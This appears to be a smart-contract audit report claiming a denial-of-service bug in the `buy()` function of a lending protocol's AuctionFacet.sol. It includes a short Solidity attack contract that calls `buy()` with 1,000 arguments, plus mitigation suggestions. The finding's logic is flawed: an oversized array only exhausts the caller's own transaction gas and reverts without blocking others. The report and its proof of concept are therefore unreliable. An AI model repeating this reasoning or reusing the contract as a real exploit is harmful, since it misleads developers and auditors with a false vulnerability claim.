# Denial-of-service (DoS) vulnerability in the `buy()` function in the AuctionFacet.sol

## Summary

## Vulnerability Detail
The `buy` function in https://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/AuctionFacet.sol#L25 could be used to create a large number of BuyArg objects and pass them all to the buy function. Each BuyArg object triggers the execution of the useLoan function which in turn computes the price and transfers tokens. If a large number of BuyArg objects are passed to the buy function, it can cause the execution to consume an excessive amount of gas, potentially leading to out-of-gas errors or blocking the execution for an extended period.

## Impact
When the attack function is called, it creates an array of BuyArg objects with a large number of elements and passes it to the buy function of the auctionFacet contract. This can cause the execution to consume an excessive amount of gas and potentially lead to out-of-gas errors or blocking the execution for an extended period, making the contract vulnerable to a DoS attack.

## Code Snippet
 - Proof of concept
 
 ```solidity
pragma solidity 0.8.18;

import {AuctionFacet} from "./AuctionFacet.sol";
import {BuyArg} from "./DataStructure/Objects.sol";

contract AuctionFacetDos {
    AuctionFacet private auctionFacet;

    constructor(address _auctionFacet) {
        auctionFacet = AuctionFacet(_auctionFacet);
    }

    function attack() external {
        uint256 numArgs = 1000; // set the number of BuyArg objects to create
        BuyArg[] memory args = new BuyArg[](numArgs);
        for (uint256 i = 0; i < numArgs; i++) {
            args[i] = BuyArg(1, address(this)); // create a BuyArg object that will trigger the useLoan function
        }
        auctionFacet.buy(args); // call the buy function with the array of BuyArg objects
    }
}
```

 

## Tool used

Manual Review

## Recommendation
To mitigate the DoS vulnerability in the buy function, you can add a limit to the number of elements that can be passed in the args array. This will limit the amount of gas that can be consumed by the for loop, preventing the attacker from using too much gas and causing the function to fail. You can also add a check to ensure that each BuyArg object passed in the args array is valid, and that it corresponds to a loan that is currently liquidable. Additionally, you can add a circuit breaker mechanism to pause the contract in case of an attack, allowing the administrator to investigate and take appropriate action.
